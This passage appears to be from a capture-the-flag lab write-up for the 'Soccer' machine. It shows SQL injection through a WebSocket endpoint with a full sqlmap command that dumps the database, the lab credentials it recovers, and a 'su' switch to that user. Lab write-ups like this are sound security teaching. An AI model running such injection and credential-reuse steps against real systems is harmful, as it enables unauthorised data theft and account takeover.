# WebSocket SQL Injection

Intercepting traffic with Burp Suite reveals a JSON structure:

```json
{
    "id":"111111"
}
```

This indicates user-controlled input is being sent directly to the backend.

A potential SQL Injection can be tested using SQLMap's WebSocket support.

---

## SQLMap

```bash
sqlmap \
-u ws://soc-player.soccer.htb:9091 \
-data '{"id":"*"}' \
--batch \
--level 3 \
--risk 3 \
--dump
```

After allowing SQLMap to increase testing depth, the database contents are dumped.

Credentials recovered:

```text
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

---

# Lateral Movement

Using the discovered credentials:

```text
player : PlayerOftheMatch2022
```

Switch users from the existing shell:

```bash
su player
```

We now have:

```text
player@soccer:/$
```

